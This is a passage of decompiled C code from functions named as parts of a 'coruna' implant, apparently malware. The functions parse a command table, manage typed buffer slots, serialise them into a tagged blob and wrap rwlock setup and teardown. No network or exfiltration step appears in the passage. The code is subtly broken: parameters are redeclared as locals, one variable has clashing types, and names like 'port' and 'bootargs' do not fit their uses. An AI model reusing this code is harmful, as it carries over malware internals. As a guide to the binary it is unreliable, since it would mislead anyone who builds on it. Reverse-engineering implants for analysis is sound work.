  u = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return 0xad014;
      }
    }
    else {
      if (err != '\x01') {
        return 0x700c;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return 0xad014;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    u = 0;
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return u;
}





unsigned long coruna_implant_apply_command_table(long arg,int val,int *n,uint m)

{
  uint type_id;
  int *err;
  int status;
  uint type_id_8;
  unsigned long size;
  unsigned long type_id_9;
  long addr;
  unsigned long version;
  int *status;
  uint *buf;
  unsigned long kind;
  uint *str;
  uint region;
  void *tmp_buf;
  
  if (((arg == 0) || (n == (int *)0x0)) || (m == 0)) {
again:
    size = 0xad001;
  }
  else {
    if ((7 < m) && (*n == -0xff24111)) {
      type_id_8 = n[1];
      if ((type_id_8 != 0) && (size = (unsigned long)type_id_8 << 4 | 8, size <= m)) {
        status = *(int *)(arg + 0xe8);
        if ((uint)(*(int *)(arg + 0xe4) - status) < type_id_8) {
          return 0xad009;
        }
        version = 0;
        do {
          err = n + version * 4 + 2;
          if (*err == 0) {
            return 0x700c;
          }
          str = (uint *)(err + 2);
          type_id_8 = *str;
          if (type_id_8 < (uint)size) {
            return 0x700c;
          }
          buf = (uint *)(n + version * 4 + 5);
          if (*buf == 0) {
            return 0x700c;
          }
          type_id = *buf + type_id_8;
          if (type_id <= type_id_8 || m < type_id) {
            return 0x700c;
          }
          kind = 0xffffffffffffffff;
          status = (int *)(arg + 0xf0);
          do {
            type_id_8 = *(uint *)(arg + 0xe8);
            kind = kind + 1;
            if (type_id_8 <= kind) {
              if (val == 2) {
                type_id_9 = (unsigned long)(uint)(status + (int)version);
                addr = arg + type_id_9 * 0x20;
                *(uint64_t *)(addr + 0xf0) = *(uint64_t *)err;
                *(uint8_t *)(addr + 0xf8) = 2;
                kind = (long)n + (unsigned long)*str;
              }
              else {
                if (val != 1) goto again;
                type_id_9 = (unsigned long)(uint)(status + (int)version);
                addr = arg + type_id_9 * 0x20;
                *(uint64_t *)(addr + 0xf0) = *(uint64_t *)err;
                *(uint8_t *)(addr + 0xf8) = 1;
                kind = (unsigned long)*str;
              }
              *(unsigned long *)(addr + 0x100) = kind;
              *(uint *)(arg + type_id_9 * 0x20 + 0x108) = *buf;
              *(uint *)(arg + 0xe8) = type_id_8 + 1;
              goto exit_ok;
            }
            if (*err == *status) {
              tmp_buf = (void *)0x0;
              region = 0;
              type_id_9 = coruna_implant_resolve_typed_buffer(arg,status,&tmp_buf,&region);
              if ((int)type_id_9 == 0) {
                if (tmp_buf == (void *)((long)n + (unsigned long)*str) && region == *buf) {
                  type_id_9 = 0;
                }
                else {
                  if (region == *buf) {
                    type_id_8 = _memcmp(tmp_buf,(void *)((long)n + (unsigned long)*str),
                                    (unsigned long)region);
                    type_id_9 = (unsigned long)type_id_8;
                    if (type_id_8 == 0) goto parse_ok;
                  }
                  type_id_9 = 0x700a;
                }
              }
            }
            else {
              type_id_9 = 0x7003;
            }
parse_ok:
            status = status + 8;
          } while ((int)type_id_9 == 0x7003);
          if ((int)type_id_9 != 0) {
            return type_id_9;
          }
exit_ok:
          version = version + 1;
          if ((uint)n[1] <= version) {
            return 0;
          }
        } while( true );
      }
    }
    size = 0x700b;
  }
  return size;
}





uint64_t coruna_implant_match_remote_buffer(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  uint64_t version;
  long handle;
  unsigned long port;
  uint64_t *buf;
  unsigned long tag;
  uint *str;
  uint scratch;
  void *bootargs;
  
  version = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    if (*(int *)(handle + 0xe8) == 0) {
      version = 0x7007;
    }
    else {
      port = 0;
      tag = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
      handle = handle + 0xf0;
      size = tag;
      do {
        bootargs = (void *)0x0;
        scratch = 0;
        version = coruna_implant_resolve_typed_buffer(handle,handle,&bootargs,&scratch);
        if ((int)version != 0) {
          return version;
        }
        port = port + 1;
        u = (scratch + 0x1f & 0xffffffe0) + (int)size;
        size = (unsigned long)u;
        handle = handle + 0x20;
      } while (port < *(uint *)(handle + 0xe8));
      ptr = _malloc(size);
      if (ptr == (uint32_t *)0x0) {
        version = 0xad009;
      }
      else {
        _bzero(ptr,size);
        err = *(int *)(handle + 0xe8);
        *ptr = 0xf00dbeef;
        ptr[1] = err;
        if (err != 0) {
          port = 0;
          str = ptr + 5;
          buf = (uint64_t *)(handle + 0xf0);
          do {
            bootargs = (void *)0x0;
            scratch = 0;
            version = coruna_implant_resolve_typed_buffer(handle,buf,&bootargs,&scratch);
            if ((int)version != 0) {
              _bzero(ptr,size);
              _free(ptr);
              return version;
            }
            str[-1] = (uint)tag;
            *str = scratch;
            *(uint64_t *)(str + -3) = *buf;
            _memcpy((void *)((long)ptr + tag),bootargs,(unsigned long)scratch);
            tag = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)tag);
            port = port + 1;
            str = str + 4;
            buf = buf + 4;
          } while (port < *(uint *)(handle + 0xe8));
        }
        version = 0;
        *val = ptr;
        *size = u;
      }
    }
  }
  return version;
}





uint64_t coruna_implant_write_slot(long handle,int flags,void *ctx,uint size,int count_2)
{
  uint u;
  int err;
  void *ptr;
  long handle;
  uint64_t size;
  unsigned long version;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if ((((handle != 0) && (flags != 0)) && (ctx != (void *)0x0)) && (size != 0)) {
    u = *(uint *)(handle + 0xe8);
    version = (unsigned long)u;
    if (u != 0) {
      handle = 0;
      do {
        if (*(int *)(handle + 0xf0 + handle) == flags) {
          bootargs = (void *)0x0;
          scratch = 0;
          size = coruna_implant_resolve_typed_buffer(handle,handle + handle + 0xf0,&bootargs,&scratch);
          if ((int)size != 0) {
            return size;
          }
          if ((bootargs != ctx || scratch != size) &&
             ((scratch != size || (err = _memcmp(bootargs,ctx,(unsigned long)size), err != 0)
              ))) {
            return 0x700a;
          }
          return 0;
        }
        handle = handle + 0x20;
      } while (version * 0x20 - handle != 0);
    }
    if (u < *(uint *)(handle + 0xe4)) {
      if (count_2 == 0) {
        handle = handle + version * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 2;
        *(void **)(handle + 0x100) = ctx;
        *(uint *)(handle + 0x108) = size;
      }
      else {
        ptr = _malloc((unsigned long)size);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memcpy(ptr,ctx,(unsigned long)size);
        handle = handle + version * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 3;
        *(void **)(handle + 0x100) = ptr;
        *(uint *)(handle + 0x108) = size;
        u = *(uint *)(handle + 0xe8);
      }
      size = 0;
      *(uint *)(handle + 0xe8) = u + 1;
    }
    else {
      size = 0x7006;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_destroy(pthread_rwlock_t *arg)
{
  uint u;
  unsigned long size;
  char *ptr;
  
  if (arg != (pthread_rwlock_t *)0x0) {
    _pthread_rwlock_destroy(arg);
    u = *(uint *)(arg[1].__opaque + 0x18);
    if (u != 0) {
      size = 0;
      ptr = arg[1].__opaque + 0x38;
      do {
        if (ptr[-0x10] == '\x03') {
          _bzero(*(void **)(ptr + -8),(unsigned long)*(uint *)ptr);
          _free(*(void **)(ptr + -8));
          u = *(uint *)(arg[1].__opaque + 0x18);
        }
        size = size + 1;
        ptr = ptr + 0x20;
      } while (size < u);
    }
    if ((*(void **)(arg[1].__opaque + 8) != (void *)0x0) &&
       (*(uint *)(arg[1].__opaque + 0x10) != 0)) {
      _bzero(*(void **)(arg[1].__opaque + 8),(unsigned long)*(uint *)(arg[1].__opaque + 0x10));
      _free(*(void **)(arg[1].__opaque + 8));
    }
    _bzero(arg,(unsigned long)*(uint *)(arg[1].__opaque + 0x14) * 0x20 + 0xf0);
    _free(arg);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_pthread_rwlock_init(uint64_t *val,uint size)
{
  size_t ls1;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    if (size < 0x19) {
      size = 0x18;
    }
    ls1 = (unsigned long)size * 0x20 + 0xf0;
    ptr = _malloc(ls1);
    if (ptr == (pthread_rwlock_t *)0x0) {
      u = 0xad009;
    }
    else {
      _bzero(ptr,ls1);
      err = _pthread_rwlock_init(ptr,(pthread_rwlockattr_t *)0x0);
      if (err == 0) {
        u = 0;
        *(uint *)(ptr[1].__opaque + 0x14) = size;
        *val = ptr;
      }
      else {
        _bzero(ptr,ls1);
        _free(ptr);
        u = 0xad020;
      }
    }
  }
  return u;
}

